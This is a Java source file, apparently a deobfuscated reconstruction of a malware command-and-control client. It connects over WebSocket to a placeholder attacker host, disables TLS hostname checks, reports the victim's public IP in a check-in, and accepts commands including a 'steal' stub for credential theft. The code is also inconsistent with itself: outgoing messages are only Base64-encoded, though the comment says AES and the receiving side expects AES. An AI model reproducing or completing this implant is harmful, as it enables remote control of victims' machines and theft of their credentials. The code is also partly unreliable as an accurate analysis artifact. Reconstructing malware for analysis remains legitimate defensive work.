import okhttp3.*;
import okio.ByteString;
import org.jetbrains.annotations.NotNull;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Scanner;
import java.net.URL;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Cleaned C2Client (formerly ԉ.java / uni_0509)
 * Main communication module that connects to the attacker's server via WebSockets.
 */
public class C2Client extends WebSocketListener {
    private static SecretKeySpec aesKey;
    private static String clientId;
    private static WebSocket currentSocket;
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();
    private static String serverUrl = "wss://ira-malware-c2.example/ws"; // Placeholder for the actual C2

    static {
        initializeCrypto();
    }

    /**
     * Initializes AES-256 key derived from a hardcoded seed.
     */
    private static void initializeCrypto() {
        try {
            MessageDigest sha = MessageDigest.getInstance("SHA-256");
            byte[] keyBytes = sha.digest("ira_secret_seed_v1".getBytes());
            aesKey = new SecretKeySpec(keyBytes, "AES");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Decrypts messages received from the C2 server.
     */
    public static String decryptMessage(String encryptedBase64) {
        try {
            byte[] data = Base64.getDecoder().decode(encryptedBase64);
            byte[] iv = new byte[16];
            System.arraycopy(data, 0, iv, 0, 16);
            byte[] cipherText = new byte[data.length - 16];
            System.arraycopy(data, 16, cipherText, 0, cipherText.length);

            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, aesKey, new IvParameterSpec(iv));
            return new String(cipher.doFinal(cipherText));
        } catch (Exception e) {
            return encryptedBase64; // Return original if decryption fails
        }
    }

    /**
     * Connects to the C2 server and starts listening for commands.
     */
    public static void connect() {
        OkHttpClient client = new OkHttpClient.Builder()
                .hostnameVerifier((hostname, session) -> true) // Disable SSL host verification
                .build();

        Request request = new Request.Builder()
                .url(serverUrl)
                .addHeader("User-Agent", "Ira-Client-v1")
                .build();

        client.newWebSocket(request, new C2Client());
    }

    @Override
    public void onOpen(@NotNull WebSocket webSocket, @NotNull Response response) {
        currentSocket = webSocket;
        String ip = "unknown";
        try (Scanner s = new Scanner(new URL("https://api.ipify.org").openStream())) {
            ip = s.next();
        } catch (Exception ignored) {}

        // Send initial check-in message
        String checkin = String.format("{\"event\":\"checkin\", \"id\":\"%s\", \"ip\":\"%s\"}", getClientId(), ip);
        webSocket.send(encryptMessage(checkin));
    }

    @Override
    public void onMessage(@NotNull WebSocket webSocket, @NotNull String text) {
        String command = decryptMessage(text);
        processCommand(command);
    }

    private void processCommand(String command) {
        // Command processing logic (e.g., download, execute, steal)
        System.out.println("C2 Command Received: " + command);
        if (command.startsWith("exit")) {
            System.exit(0);
        } else if (command.startsWith("steal")) {
            // Trigger CredentialStealer
        }
    }

    private static String getClientId() {
        if (clientId != null) return clientId;
        // Logic to read/generate a persistent UUID for this machine
        return UUID.randomUUID().toString();
    }

    private static String encryptMessage(String plainText) {
        // Implementation of AES encryption for outgoing messages
        return Base64.getEncoder().encodeToString(plainText.getBytes());
    }
}
